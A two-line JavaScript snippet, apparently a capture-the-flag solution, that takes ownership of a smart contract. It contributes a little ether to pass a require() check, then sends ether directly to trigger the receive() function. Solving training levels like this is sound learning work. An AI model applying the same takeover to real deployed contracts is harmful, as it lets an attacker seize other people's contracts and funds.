//contribute first to pass the require() in the receive function
await contract.contribute({value: 0.001});

// Send some eth to the contract to trigger the receive() function, we should be the owners now
await contract.sendTransaction({value: 0.001});